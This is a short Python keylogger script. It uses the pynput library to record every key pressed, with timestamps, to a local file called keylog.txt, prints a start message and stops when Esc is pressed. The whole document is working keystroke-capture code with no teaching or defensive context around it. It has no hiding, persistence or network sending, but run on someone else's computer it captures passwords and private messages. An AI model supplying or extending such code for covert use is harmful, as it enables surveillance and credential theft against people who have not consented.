
import logging
from pynput.keyboard import Key, Listener
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")
def on_release(key):
    if key == Key.esc:
        return False
print("Keylogger started... Press 'Esc' to stop.")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
